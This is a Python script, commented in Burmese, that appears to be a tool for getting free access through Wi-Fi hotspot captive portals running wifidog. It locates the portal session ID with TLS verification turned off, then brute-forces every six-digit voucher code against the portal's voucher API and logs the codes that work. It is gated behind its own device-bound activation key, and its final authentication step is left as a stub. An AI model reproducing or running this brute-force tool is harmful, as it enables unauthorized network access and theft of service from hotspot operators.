import requests
import re
import urllib3
import time
import threading
import hashlib
import os
from urllib.parse import urlparse, parse_qs, urljoin

# Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SECRET_SALT = "ohmygod@123"
PING_THREADS = 30
PING_INTERVAL = 0.05
SUCCESS_FILE = "success.txt"
FAIL_FILE = "fail.txt"

def get_stable_id():
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial:
            serial = os.popen("getprop ro.build.display.id").read().strip()
    except:
        serial = "DEFAULT_NODE"
    fixed_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
    return f"TRB-{fixed_hash}"

def verify_activation():
    device_id = get_stable_id()
    key_file = os.path.join(os.path.expanduser("~"), ".turbo_license")
    correct_key = hashlib.sha256(f"{device_id}{SECRET_SALT}".encode()).hexdigest()[:12].upper()
    
    if os.path.exists(key_file):
        with open(key_file, "r") as f:
            if f.read().strip() == correct_key: return True

    print(f"DEVICE ID: {device_id}")
    input_key = input("Enter Activation Key: ").strip().upper()
    if input_key == correct_key:
        with open(key_file, "w") as f: f.write(input_key)
        return True
    return False

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=0.8).status_code == 200
    except: return False

def get_portal_info():
    """Portal URL နှင့် Session ID ကို ရှာဖွေပေးရန်"""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        portal_url = r.url
        parsed_portal = urlparse(portal_url)
        portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
        
        session = requests.Session()
        r1 = session.get(portal_url, verify=False, timeout=5)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
        r2 = session.get(next_url, verify=False, timeout=5)
        
        sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
        return portal_host, sid, parsed_portal.query
    except:
        return None, None, None

def bruteforce_vouchers(portal_host, sid):
    print(f"\n[*] Starting Bruteforce for SID: {sid}")
    voucher_api = f"{portal_host}/api/auth/voucher/"
    
    # စမ်းသပ်ပြီးသား code များကို skip ရန် (optional)
    for i in range(1000000):
        code = f"{i:06d}"
        try:
            resp = requests.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=3)
            if resp.status_code == 200:
                print(f"\n[✔] SUCCESS CODE FOUND: {code}")
                with open(SUCCESS_FILE, "a") as f: f.write(f"{code}\n")
                return code
            else:
                print(f"Fail Code: {code} ", end='\r')
                # Optional: with open(FAIL_FILE, "a") as f: f.write(f"{code}\n")
        except:
            continue
    return None

def start_process(option):
    print(f"[*] Initializing...")
    host, sid, query = get_portal_info()
    
    if not sid:
        print("[-] Could not find Portal Session. Are you connected to the network?")
        return

    if option == '2':
        voucher = bruteforce_vouchers(host, sid)
        if not voucher: return
    else:
        voucher = '123456' # Default or logic for Option 3

    # Authentication & Pinging Logic
    params = parse_qs(query)
    gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
    gw_port = params.get('gw_port', ['2060'])[0]
    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

    print(f"[*] Activating with {voucher}...")
    # (Pinging logic follows your original threading code here)

if __name__ == "__main__":
    if verify_activation():
        print("\n1) Get Internet Access")
        print("2) Bruteforce Access Voucher Code")
        print("3) Recheck Success Code")
        choice = input("\nEnter an Option: ")
        start_process(choice)
        
